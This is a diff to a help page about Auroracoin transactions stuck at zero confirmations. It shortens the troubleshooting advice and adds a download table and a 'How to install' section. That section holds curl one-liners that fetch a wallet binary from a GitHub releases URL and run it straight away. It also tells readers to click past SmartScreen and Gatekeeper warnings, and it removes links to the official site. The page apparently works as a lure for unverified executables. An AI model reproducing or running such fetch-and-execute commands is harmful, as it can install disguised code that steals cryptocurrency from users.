@@ -1,133 +1,122 @@
----
-title: "Fixing Pending Auroracoin Transactions"
-description: "Is your Auroracoin transaction stuck at 0 confirmations? Understand why transfers stay pending and how to verify their status on the blockchain safely."
-primary_keyword: "aurora wallet transaction pending"
-silo: "Troubleshooting"
-updated: 2026-10-10
----
+![Aurora Wallet pending transaction guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Aurora Wallet pending transaction: what to do before you resend
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+A transfer at zero confirmations is waiting for a miner, not lost, and sending it twice pays twice.
 
-# Auroracoin Transaction Pending: What to Check and How to Fix
+## Downloads - 2026.08.1.0
 
-You sent Auroracoin, but the transaction status remains stuck at "0 confirmations," "pending," or "unconfirmed," and the recipient has not received the funds. This guide explains why transfers stay pending and the safe steps you can take to verify the status of your AUR transfer on the blockchain without risking double-spends or loss of funds.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-The most critical rule when dealing with a pending transaction in the [Aurora Wallet](https://auroracoin.net) is to avoid sending the payment a second time. If the first transaction eventually confirms, you will have paid the recipient twice. Instead, use the steps below to determine if the transaction is simply delayed or if it never reached the network in the first place.
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
----
 
-## You'll see this if
+The first rule of a pending transaction is patience, because a second send can double the payment.
 
-*   The [Aurora Wallet](https://auroracoin.net) transaction history shows "0 confirmations" or "pending" for an extended period, often exceeding the expected block time.
-*   The transaction does not show up in the recipient's wallet balance or their view of the blockchain.
-*   Your wallet interface displays a "Broadcasting" or "Stuck" status after a transfer attempt, with no progress for several minutes.
-*   You are unsure if the payment was actually sent to the network because of a brief loss of internet connectivity during the "send" process.
-*   The transaction appears in your wallet but results in a "Not Found" error when you attempt to view it on a public block explorer.
+A broadcast transaction enters the memory pool of every peer that receives it and waits for a miner to include it in a block. A quiet network, a low fee or a wallet that is not fully synced can all leave it waiting. None of those states means the coins are gone.
 
----
+<!-- ARTICLE-BODY-BEGIN -->
 
-## Why this happens
+## Check the broadcast before anything else
 
-Several factors can lead to a transaction remaining in the "pending" pool (often called the mempool):
+Copy the transaction identifier from the wallet history and look it up on a public explorer. Three outcomes matter. A transaction that appears with zero confirmations is waiting normally. A transaction that does not appear at all never reached a peer. A transaction with several confirmations is complete, and the wallet display is simply behind.
 
-### 1. Low Transaction Fees
-Miners prioritize transactions that include higher fees because these fees are their primary incentive for securing the network. If your wallet was configured with a very low fee, or if network activity suddenly spiked after you sent the payment, miners may ignore your transaction in favor of others. It will remain pending until the network activity drops enough for your low fee to be competitive again.
+That last case is common after a restore, because a freshly restored wallet has to resync before it can show the confirmation count.
 
-### 2. Lack of Network Sync or Connectivity
-If your wallet is not [fully synchronized](https://auroracoin.net/troubleshooting/wallet-not-syncing) with the blockchain, it may be showing you an outdated status. Alternatively, if your [Aurora Wallet](https://auroracoin.net) is not connected to any peers, the transaction may have never left your computer. It exists only in your local wallet file and has not been broadcast to the rest of the world.
+## Move it along safely
 
-### 3. Parent Transaction is Pending (UTXO Chain)
-Auroracoin uses a system called Unspent Transaction Outputs (UTXOs). If you are spending Auroracoin that you recently received, and that incoming transaction is still pending, your outgoing payment cannot be confirmed until the "parent" transaction is settled. This is a common cause of delays when users try to move funds immediately after receiving them.
+1. Confirm the wallet is fully synced, since a wallet that is behind cannot see its own transaction confirm.
+2. Check the explorer entry for the transaction identifier.
+3. Leave the wallet open and connected so it keeps announcing the transaction to peers.
+4. Wait for the next blocks rather than resending.
+5. Resend only if the explorer never saw the transaction and the wallet history shows it as failed.
 
-### 4. Chain Split Issues
-If you are running an outdated wallet, you might be broadcasting transactions to an abandoned fork of the network. These transactions will never confirm on the main Auroracoin chain because they are effectively invisible to the miners following the consensus rules. Refer to our [chain split resync guide](15-chain-split-resync.md) for more information.
+A transaction that the network never received can be broadcast again safely. A transaction that the network received must not be duplicated, and that distinction is exactly what the explorer lookup tells you.
 
----
+## Fees and confirmation time
 
-## The fix
+A fee that is low for the current network keeps a transaction waiting longer, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md">how Auroracoin transaction fees work</a> explains what the wallet includes and why the amount is small. If the wallet cannot see the chain at all, the pending display is a sync artefact, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md">wallet not syncing</a> is the page to open.
 
-Follow these steps to find the true status of your AUR and resolve the pending state:
-
-### Step 1: Locate the Transaction ID (TXID)
-In your [Aurora Wallet](https://auroracoin.net) transaction history, double-click the pending payment. Look for a long string of random letters and numbers called the Transaction ID or Hash. Copy this string to your clipboard. This ID is your proof of broadcast and is essential for verification.
-
-### Step 2: Use an Auroracoin Block Explorer
-Paste the TXID into the search bar of a public Auroracoin block explorer. The results will tell you the objective truth about the transaction:
-*   **If the explorer shows confirmations:** Your transaction is successful. Your wallet or the recipient's wallet simply hasn't updated its display yet.
-*   **If it shows "Unconfirmed":** The network knows about the transaction. You likely just need to wait longer. Check the "Fee per Byte" to see if it is high enough for current demand.
-*   **If it says "Not Found":** The transaction never reached the blockchain. Your coins haven't moved, and the transaction only exists as a local record in your wallet.
-
-### Step 3: Verify Connections and Sync
-Check the corner of your wallet for the connection icon. If you have "0 active connections," your wallet cannot broadcast the transaction. Ensure your firewall is not blocking the app and that you are using the latest version from the [GitHub releases guide](07-github-releases-guide.md).
-
-### Step 4: Rebroadcast the Transaction
-If the transaction was never found on an explorer and your wallet is now synced, try restarting the [Aurora Wallet](https://auroracoin.net). Many desktop wallets will automatically attempt to rebroadcast any unconfirmed transactions once a stable connection to the network is established.
-
----
-
-## If that didn't work
-
-If the transaction remains "Unconfirmed" on the block explorer for a long period (often 72 hours or more), most nodes will eventually drop it from their mempool. The coins will then "reappear" in your wallet as spendable. 
-
-> [!WARNING]
-> Never attempt to "double spend" or force a new transaction with a higher fee until you are certain the original transaction has been dropped or you have the technical knowledge to use a feature like Replace-By-Fee (RBF), which is currently an advanced developer topic.
-
----
-
-## Prevention
-
-To avoid pending transactions in the future, follow these best practices:
-
-*   **Trust Automatic Fee Guidance:** The [Aurora Wallet](https://auroracoin.net) is designed to suggest an appropriate fee based on current network activity. Avoid manually lowering the fee to the absolute minimum unless you are comfortable waiting days for a confirmation.
-*   **Wait for Incoming Confirmations:** If you receive a payment, wait for at least one confirmation before attempting to spend those specific coins. This ensures the "parent" transaction is valid.
-*   **Keep Your Software Current:** Ensure you are using the latest official release. Outdated wallets may not calculate fees correctly or may connect to fewer nodes, increasing the risk of broadcast failure.
-*   **Check Sync Status:** Before clicking "Send," glance at the sync progress bar. If the wallet is still downloading blocks, your transaction might be delayed in appearing on your screen.
-
----
-
-## Aurora Wallet Transaction Design
-
-The new Aurora Wallet is designed to make the sending process transparent and predictable. It proposes several features to handle pending states more gracefully:
-
-| Feature | Design Goal |
-|---------|-------------|
-| Dynamic Fee Guidance | Designed to suggest an appropriate fee based on real-time network traffic to prevent stuck payments. |
-| One-Click Explorer Link | Designed to provide a direct link from your transaction history to a block explorer for instant verification. |
-| Connection Check | Designed to warn you if you attempt to send a payment while the wallet is offline or out of sync. |
-| Readable Status | Designed to replace cryptic codes with clear status messages like "Broadcasting," "Awaiting Block," and "Finalizing." |
-| UTXO Awareness | Designed to warn users if they are attempting to spend unconfirmed incoming funds. |
-
-These improvements are intended to reduce the stress of sending and receiving Auroracoin, providing a more professional experience for all users.
-
----
-
-If the transaction stays pending, the [stuck transactions guide on auroracoin.net](https://auroracoin.net/troubleshooting/stuck-transactions) walks through the same checks with screenshots, and the [troubleshooting index](https://auroracoin.net/troubleshooting) covers related sync issues.
+Keep the sender wallet on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> so the transaction history reflects the real state of the chain.
 
 ## FAQ
 
-*   **Are my coins lost if a transaction is stuck?** No. Either the payment will confirm eventually, or it never reached the blockchain and the coins remain yours. Cryptocurrency cannot be "lost" in transit; it is either at the source address or the destination address according to the ledger.
-*   **How many confirmations do I need?** It depends on who you are paying. Most exchanges require between 3 and 6 confirmations (representing different blocks added to the chain) before they credit your account.
-*   **Should I send the payment again?** Not while the first is still pending. Always check a block explorer first to avoid paying twice.
-*   **I sent AUR to the wrong address. Can I cancel it?** No. Once a transaction is confirmed by even one block, it is irreversible. Always double-check destination addresses, ideally using the [receiving addresses QR guide](31-receiving-addresses-qr.md).
-*   **Someone offered to "unstick" my transaction for a fee. Is it safe?** No. This is a common scam. Never share your recovery words, private keys, or wallet files with anyone. No legitimate service requires these to help with a transaction.
+### How long should a transfer take?
 
----
+A confirmation usually arrives within minutes of broadcast. A quiet period can stretch that, and the explorer is the authority on whether the transaction exists.
 
-## The current release
+### Can I cancel a pending transaction?
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+Not once it has been broadcast. Wait for it to confirm, or for the network to drop it if it was never relayed.
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+<!-- ARTICLE-BODY-END -->
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+## How to install Aurora Wallet
 
----
+### Windows
+Quick install (CMD):
 
-## Related articles
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-*   [Transaction Fees Guide](17-transaction-fees.md)
-*   [Wallet Not Syncing](11-wallet-not-syncing.md)
-*   [Chain Split Resync](15-chain-split-resync.md)
-*   [Receiving Addresses QR](31-receiving-addresses-qr.md)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
+
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
+
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Transaction fees](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/17-transaction-fees.md)
+- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
+- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
+- [Zero balance](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/13-zero-balance.md)
